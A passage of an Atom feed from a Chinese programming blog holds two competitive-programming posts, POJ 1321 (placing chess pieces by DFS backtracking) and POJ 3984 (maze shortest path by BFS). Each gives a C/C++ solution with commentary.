    <published>2018-10-28T05:15:07.000Z</published>
    <updated>2019-03-20T05:16:47.458Z</updated>
    
    <content type="html"><![CDATA[<p> <a href="http://poj.org/problem?id=1321" target="_blank" rel="noopener">原题链接</a></p><p>在一个给定形状的棋盘（形状可能是不规则的）上面摆放棋子，棋子没有区别。要求摆放时任意的两个棋子不能放在棋盘中的同一行或者同一列，请编程求解对于给定形状和大小的棋盘，摆放k个棋子的所有可行的摆放方案C。</p><p>这个题非常经典，深搜的回溯，细细品尝，必有所获。<br>每次遇到合适的位置，立即钻进去，转而进入下一个深搜，直到棋子完全拜完，此深搜结束，回到上一个深搜状态，再进行恢复现场，恢复完后先到下一列，下一列可行又继续前面的状态，换列不能解决就换行，直到行数跑完，行数跑完则结束当前深搜，继续改变上一个深搜状态。“第一个”深搜以最后一行作为起点，才真正结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sf scanf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,a,b) for(int i=a;i&lt;(b);++i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> G[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="keyword">bool</span> fg[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 走过为真</span></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>, n, k;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> cur, <span class="keyword">int</span> x)</span> </span>&#123;  <span class="comment">// cur为已摆的棋子数， x 为行数</span></span><br><span class="line">    <span class="keyword">if</span>(cur == k) &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    rep(i, x, n)</span><br><span class="line">        rep(j, <span class="number">0</span>, n)</span><br><span class="line">            <span class="keyword">if</span>(G[i][j] == <span class="string">'#'</span> &amp;&amp; !fg[j]) &#123;</span><br><span class="line">                fg[j] = <span class="literal">true</span>;</span><br><span class="line">                dfs(cur+<span class="number">1</span>, i+<span class="number">1</span>);  <span class="comment">// 下一行继续摆下一个棋子</span></span><br><span class="line">                fg[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(sf(<span class="string">"%d%d"</span>, &amp;n, &amp;k) == <span class="number">2</span> &amp;&amp; n != <span class="number">-1</span> &amp;&amp; k != <span class="number">-1</span>) &#123;</span><br><span class="line">        rep(i,<span class="number">0</span>,n) sf(<span class="string">"%s"</span>,G[i]);</span><br><span class="line">        dfs(<span class="number">0</span>, <span class="number">0</span>);  <span class="comment">// 第一行开始摆</span></span><br><span class="line">        pf(<span class="string">"%d\n"</span>, ans); ans = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; &lt;a href=&quot;http://poj.org/problem?id=1321&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在一个给定形状的棋盘（形状可能是不规则的）上面摆放棋子，棋子没有区别。要求摆放时任意的两个棋子不
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>POJ-3984-迷宫问题[BFS]</title>
    <link href="https://wywwzjj.top/2018/10/28/POJ_3984_%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98_BFS/"/>
    <id>https://wywwzjj.top/2018/10/28/POJ_3984_迷宫问题_BFS/</id>
    <published>2018-10-28T05:10:37.000Z</published>
    <updated>2019-03-20T05:13:10.330Z</updated>
    
    <content type="html"><![CDATA[<p>定义一个二维数组：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> maze[<span class="number">5</span>][<span class="number">5</span>] = &#123;</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>它表示一个迷宫，其中的1表示墙壁，0表示可以走的路，只能横着走或竖着走，不能斜着走，要求编程序找出从左上角到右下角的最短路线。</p><p>此题题意比较简单，就是找一条左上到右下的最短路，并打印出来。这种简单的最短路直接 $BFS$ 就解决了。稍微麻烦一点在于打印，那么该如何去储存这条最短路线呢？题目明确指出打印出坐标，那直接用个 $pair$ 储存一下 $x,\ y$ 就好了，可以尝试建立一个 $pair$ 数组，又需要路线，那我们存一下前驱坐标就行了。问题来了，从哪端开始存方便一些，如果从起始坐标 $(0,\ 0)$ 处就存的话，结点必然不唯一，比如说离 $(0, \ 0)$ 距离为 $1$ 的可能就好几个（ps：此处不理解的话可以去看看 floodfill）。所以尝试一下从结尾处开始存，结尾处的结点前驱就唯一了，想一想为什么？然而从结尾开始存的话又需要一个栈倒一下顺序，那直接从 $(4,\ 4)$ 向 $(0,\ 0)$搜索就好了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sf scanf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,a,b) for(int i=a;i&lt;(b);++i)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> mm[<span class="number">6</span>][<span class="number">6</span>];</span><br><span class="line">pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pre[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &gt; qq; qq.push(mp(x, y));</span><br><span class="line">    <span class="keyword">while</span>(!qq.empty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> inext[] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> jnext[] = &#123;<span class="number">-1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        rep(k, <span class="number">0</span>, <span class="number">4</span>) &#123;  <span class="comment">// 结点的上下左右各查找一次</span></span><br><span class="line">            <span class="keyword">int</span> icur = qq.front().fi + inext[k];</span><br><span class="line">            <span class="keyword">int</span> jcur = qq.front().se + jnext[k];</span><br><span class="line">            <span class="keyword">if</span>(icur &lt; <span class="number">0</span> || icur &gt;<span class="number">4</span> || jcur &lt; <span class="number">0</span> ||  <span class="comment">// 去除越界位置</span></span><br><span class="line">               jcur &gt; <span class="number">4</span> || (icur == x &amp;&amp; jcur == y)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(!mm[icur][jcur] &amp;&amp; !pre[icur][jcur].first) &#123;  <span class="comment">// 能走并且未走过(pair元素默认为空)</span></span><br><span class="line">                qq.push(mp(icur, jcur));  <span class="comment">// 加入队列</span></span><br><span class="line">                <span class="comment">// 此时的队首元素即为下一个结点的前驱，不熟悉的朋友可以建立如下结构，熟悉一下BFS，打印出来观察一下</span></span><br><span class="line">                <span class="comment">// fg[icur][jcur] = fg[qq.front().first][qq.front().second] + 1; </span></span><br><span class="line">                <span class="comment">// fg[i][j]：i, j位置离起点的最短距离</span></span><br><span class="line">                pre[icur][jcur] = qq.front();   <span class="comment">// 记录前驱位置</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(icur == <span class="number">0</span> &amp;&amp; jcur == <span class="number">0</span>) <span class="keyword">return</span>;  <span class="comment">// 到终点了就退出</span></span><br><span class="line">        &#125;</span><br><span class="line">        qq.pop();  <span class="comment">// 查找过的结点就直接pop</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//freopen("D:\\i.txt","r",stdin);</span></span><br><span class="line">    rep(i, <span class="number">0</span>, <span class="number">5</span>) rep(j, <span class="number">0</span>, <span class="number">5</span>) <span class="built_in">cin</span>&gt;&gt;mm[i][j];</span><br><span class="line"> </span><br><span class="line">    bfs(<span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"(0, 0)"</span>);</span><br><span class="line">    pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; tmp(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span>(tmp.fi != <span class="number">4</span> || tmp.se != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = tmp.fi;</span><br><span class="line">        <span class="keyword">int</span> j = tmp.se;</span><br><span class="line">        pf(<span class="string">"(%d, %d)\n"</span>, pre[i][j].fi, pre[i][j].se);</span><br><span class="line">        tmp = pre[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;定义一个二维数组：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
